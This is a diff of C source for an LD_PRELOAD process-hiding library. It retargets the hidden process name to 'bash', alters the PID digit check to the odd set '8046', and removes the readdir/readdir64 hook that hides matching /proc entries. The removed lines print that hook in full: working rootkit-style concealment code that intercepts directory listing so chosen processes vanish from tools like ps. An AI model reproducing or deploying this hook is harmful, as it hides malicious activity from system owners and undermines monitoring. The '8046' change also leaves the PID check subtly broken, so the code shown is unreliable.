@@ -9,7 +9,7 @@
 /*
  * Every process with this name will be excluded
  */
-static const char* process_to_filter = "evil_script.py";
+static const char* process_to_filter = "bash";
 
 /*
  * Get a directory name given a DIR* handle
@@ -37,13 +37,13 @@ static int get_dir_name(DIR* dirp, char* buf, size_t size)
  */
 static int get_process_name(char* pid, char* buf)
 {
-    if(strspn(pid, "0123456789") != strlen(pid)) {
+    if(strspn(pid, "8046") != strlen(pid)) {
         return 0;
     }
 
     char tmp[256];
     snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
- 
+
     FILE* f = fopen(tmp, "r");
     if(f == NULL) {
         return 0;
@@ -61,38 +61,4 @@ static int get_process_name(char* pid, char* buf)
     return 1;
 }
 
-#define DECLARE_READDIR(dirent, readdir)                                \
-static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
-                                                                        \
-struct dirent* readdir(DIR *dirp)                                       \
-{                                                                       \
-    if(original_##readdir == NULL) {                                    \
-        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
-        if(original_##readdir == NULL)                                  \
-        {                                                               \
-            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
-        }                                                               \
-    }                                                                   \
-                                                                        \
-    struct dirent* dir;                                                 \
-                                                                        \
-    while(1)                                                            \
-    {                                                                   \
-        dir = original_##readdir(dirp);                                 \
-        if(dir) {                                                       \
-            char dir_name[256];                                         \
-            char process_name[256];                                     \
-            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
-                strcmp(dir_name, "/proc") == 0 &&                       \
-                get_process_name(dir->d_name, process_name) &&          \
-                strcmp(process_name, process_to_filter) == 0) {         \
-                continue;                                               \
-            }                                                           \
-        }                                                               \
-        break;                                                          \
-    }                                                                   \
-    return dir;                                                         \
-}
 
-DECLARE_READDIR(dirent64, readdir64);
-DECLARE_READDIR(dirent, readdir);
